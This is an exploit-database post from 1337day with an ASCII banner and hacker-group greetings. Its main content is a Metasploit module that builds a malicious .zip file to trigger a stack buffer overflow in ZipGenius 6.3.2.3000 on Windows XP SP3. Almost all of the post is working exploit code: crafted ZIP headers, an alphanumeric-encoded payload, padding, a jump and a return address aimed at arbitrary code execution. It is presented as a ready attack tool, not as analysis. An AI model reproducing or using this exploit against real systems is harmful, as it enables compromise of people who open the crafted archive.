1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I'm KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

###
# Title : ZipGenius v6.3.2.3000 (.zip) Buffer Overflow Exploit (MSF)
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com
# Home : Hassi.Messaoud (30008) - Algeria -(00213555248701)
# Web Site : www.1337day.com * www.exploit-id.com * www.dis9.com
# Twitter page : twitter.com/kedans | http://kedans.dis9.com
# platform : windows
# Impact : Buffer Overflow
# Tested on : Windows XP SP3 (En)
##
# [Indoushka] => Welcome back Br0ther <3 ^^
##
# | >> -------+++=[ Dz Offenders Cr3w ]=+++----- << |
# | Indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3 |
# | Jago-dz * Over-X * Kha&miX * Ev!LsCr!pT_Dz * ...|
# | ----------------------------------------------- |
# + All Dz .. This is Open Group 4 L33T Dz Hax3rZ ..
###

##
# $Id: $ zipgns_bof.rb | 08/08/2011 01:14 | KedAns-Dz $
##

require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
         super(update_info(info,
           'Name' => 'ZipGenius v6.3.2.3000 (.zip) Buffer Overflow Exploit',
           'Description'    => %q{
            This module exploits a stack buffer overflow in versions 6.3.2.3000
           creating a specially crafted .zip file, an attacker may be able 
           to execute arbitrary code.
            },
            'License' => MSF_LICENSE,
            'Author' => 
             [
             'C4SS!0 G0M3S', # Original
             'KedAns-Dz <ked-h[at]hotmail.com>' # MSF Module
             ],
            'Version' => 'Version 1.0',
            'References' =>
              [
                ['URL', 'http://1337day.com/exploits/16501' ],
              ],
            'DefaultOptions' =>
              {
                'EXITFUNC' => 'process',
              },
            'Payload' =>
              {
                'Space' => 1024,
                'BadChars' => "\x0a\x3a",
                'StackAdjustment' => -3500,
				'DisableNops' => 'True',
                'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
                'EncoderOptions' =>
                  {
                    'BufferRegister' => 'ESI',
                  }
              },
            'Platform' => 'win',
            'Targets' =>
              [
                [ 'Windows XP SP3 (En)', { 'Ret' => 0x0283119C} ], #
              ],
            'Privileged' => false,
            'DefaultTarget' => 0))

        register_options(
           [
              OptString.new('FILENAME', [ false, 'The file name.', 'msf.zip']),
           ], self.class)
    end
 
    def exploit
      sploit = "\x50\x4B\x03\x04\x14\x00\x00"
        sploit << "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
        sploit << "\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f"
        sploit << "\x00\x00\x00"
		sploit << payload.encoded
        sploit << rand_text_alphanumeric(1060) # Buffer junk1
		sploit << "\xeb\x0b\x90\x90" # Jump's
        sploit << [target.ret].pack('V')
		sploit << rand_text_alphanumeric(11) # junk2
		sploit << "\x61" * 13
        sploit << "\x58\x50\xc3"
        sploit << rand_text_alphanumeric(4064)
		sploit << ".txt"
		sploit << "\x50\x4B\x01\x02\x14\x00\x14"
        sploit << "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
        sploit << "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        sploit << "\xe4\x0f"
        sploit << "\x00\x00\x00\x00\x00\x00\x01\x00"
        sploit << "\x24\x00\x00\x00\x00\x00\x00\x00"
		sploit << payload.encoded
        sploit << rand_text_alphanumeric(1060) # Buffer
		sploit << "\xeb\x0b\x90\x90" # Jump's
        sploit << [target.ret].pack('V')
		sploit << rand_text_alphanumeric(11)
		sploit << "\x61" * 13
        sploit << "\x58\x50\xc3"
        sploit << rand_text_alphanumeric(4064)
		sploit << ".txt"
		sploit << "\x50\x4B\x05\x06\x00\x00\x00"
        sploit << "\x00\x01\x00\x01\x00"
        sploit << "\x12\x10\x00\x00"
        sploit << "\x02\x10\x00\x00"
        sploit << "\x00\x00"
 
        ked = sploit
        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(ked)
 
    end
 
end


